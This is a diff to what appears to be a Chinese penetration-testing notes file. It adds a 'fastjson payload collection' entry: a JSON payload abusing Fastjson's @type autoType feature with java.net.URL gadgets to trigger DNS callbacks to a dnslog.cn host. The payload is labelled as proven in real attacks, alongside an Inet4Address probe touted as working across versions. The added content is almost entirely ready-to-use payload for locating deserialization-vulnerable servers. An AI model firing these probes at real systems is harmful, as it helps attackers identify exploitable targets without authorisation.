@@ -222,13 +222,20 @@ Content-Length: 137
 （比网上很多payload都要好用，通杀版本）
 
     payload:
-    
+
     ```
      {"zeo":{"@type":"java.net.Inet4Address","val":"dnslog的位置"}}
     ```
     ![](https://img-blog.csdnimg.cn/20200722205445187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTU5ODY2MA==,size_16,color_FFFFFF,t_70)
 
     ![](https://img-blog.csdnimg.cn/20200722205536663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTU5ODY2MA==,size_16,color_FFFFFF,t_70)
+
+## fastjson paylaod 收集
+
+java.net.URL 函数（实战成功）
+```
+{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":""}}""},"b":{{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"}:"x"},"c":{{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"}:0,"d":Set[{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"}],"e":Set[{"@type":"java.net.URL","val":"http://cij9t8.dnslog.cn"},}
+```
 
 # 免责声明
 
